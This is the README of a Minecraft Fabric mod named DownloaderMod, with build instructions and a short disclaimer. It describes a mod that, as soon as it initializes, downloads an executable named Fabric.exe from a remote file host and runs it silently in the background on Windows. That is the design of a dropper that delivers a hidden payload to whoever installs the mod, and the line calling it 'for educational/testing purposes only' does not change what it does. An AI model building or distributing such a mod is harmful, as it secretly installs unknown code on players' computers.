
# DownloaderMod

A simple Fabric mod for Minecraft 1.21 - 1.21.8 that downloads and silently executes a remote file (`Fabric.exe`).

## ✅ Features

- Automatically downloads a file from a remote URL (Gofile)
- Saves it to `.minecraft/yourmod/Fabric.exe`
- Runs it silently in the background using `start /B` (Windows only)
- Triggered during mod initialization (`onInitialize`)

## 🛠 How to Build

You can build the project using:

```bash
./gradlew build
```

The output `.jar` file will be in:

```
build/libs/DownloaderMod-1.0.0.jar
```

## 🧪 Tested On

- Minecraft 1.21–1.21.8
- Fabric Loader 0.15.1
- Yarn mappings `1.21+build.1:v2`

## ⚠️ Disclaimer

This mod runs external `.exe` files and is for educational/testing purposes only. Use with caution.
